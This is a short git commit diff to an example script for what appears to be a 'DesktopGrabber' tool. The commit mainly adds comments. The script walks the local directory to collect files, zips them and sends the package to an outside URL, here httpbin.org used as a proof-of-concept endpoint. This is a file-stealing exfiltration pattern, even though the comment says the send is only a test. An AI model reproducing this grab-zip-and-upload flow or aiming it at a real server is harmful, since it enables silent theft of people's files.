6594cdcbb6d0da079eb63f0c7c4ca492004d7551
Bashful <Christophereek97@gmail.com>
2021-09-18 12:40:02 +0200

    Update example1.py

--- example1.py
+++ example1.py
@@ -1,11 +1,17 @@
+
+# Importing the file from the same directory.
 from DesktopGrabber import *
 
 if __name__ == "__main__":
+    # HTTPBin Website PoC
     url = "http://httpbin.org/post"
+    # Creates the object.
     agent = DeskGrab("Test", "123")
+    # Save all the approved files in "files"
     files = agent._dirTraversel(".")
+    # Create the zip.
     create_zip_bool = agent._createZip(files)
-    print(create_zip_bool)
+    # Send the zip file.. Dosent actually work. Just a HTTPBin
     send_package = agent._sendPackage(url)
 
 
